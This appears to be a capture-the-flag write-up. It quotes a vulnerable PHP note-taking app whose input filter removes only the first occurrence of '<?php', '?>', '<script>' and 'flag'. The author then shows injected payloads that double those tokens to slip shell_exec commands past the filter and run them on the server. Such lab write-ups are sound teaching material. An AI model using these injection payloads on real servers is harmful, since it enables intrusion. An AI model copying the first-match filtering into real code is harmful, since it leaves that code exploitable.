# ProgrammersHateProgramming

**Author:** AOx0 :: Alejandro

![](https://i.imgur.com/1MCf59f.png)

First I looked at the code to see what was going on:

```php
function str_replace_first($from, $to, $content)
{
    $from = '/'.preg_quote($from, '/').'/';

    return preg_replace($from, $to, $content, 1);
}
function generateRandomString($length = 15) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];
    $notetoadd = str_replace_first("<?php", "", $newnote);
    $notetoadd = str_replace_first("?>", "", $notetoadd);
    $notetoadd = str_replace_first("<script>", "", $notetoadd);
    $notetoadd = str_replace_first("</script>", "", $notetoadd);
    $notetoadd = str_replace_first("flag", "", $notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
```



We can see that the only ''*protection*'' method is to use `str_replace_first` and remove every <?php, flag, or any of those words from the string we input to the website.

```php
if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];
    $notetoadd = str_replace_first("<?php", "", $newnote);
    $notetoadd = str_replace_first("?>", "", $notetoadd);
    $notetoadd = str_replace_first("<script>", "", $notetoadd);
    $notetoadd = str_replace_first("</script>", "", $notetoadd);
    $notetoadd = str_replace_first("flag", "", $notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
```



The thing is that it only removes the first match of the string. 

So:

- `"flag"`  ---> `""`
-  `"flag flag"` ---> `" flag"`



Let's test it:

![](https://i.imgur.com/GLxsbOF.png)

And if we open the Note the site created we get:

![](https://i.imgur.com/7c4QWKH.png)

Now lets try with `flag flag`

![](https://i.imgur.com/bdFrdZ9.png)

And we get:

![](https://i.imgur.com/mn8L0Aa.png)



## Exploit

So i just wrote a php to execute an `ls` and try to see if it works.

```php
<?php echo shell_exec("ls"); ?>
```

But with an extra of each forbidden word so the important ones do not get deleted, extra <php?, etc.

```php
flag <?php <?php echo shell_exec("ls"); ?>  ?>
```

![](https://i.imgur.com/8TAdNQQ.png)

![](https://i.imgur.com/MgWffh2.png)

Yep, we get the list of all notes that have been created. 

After that I explored the server until I found the flag at `/` in a file called `flag.php`. So I just executed it with php to get the output (I did saw a lot of people doing crazy things to get the flag lol)



```php
flag <?php <?php echo shell_exec("php /flag.php"); ?>  ?>
```

Notice the extra `flag`, `<?php` and `?>` 

![](https://i.imgur.com/l4pIh98.png)

![](https://i.imgur.com/HbG1EiB.png)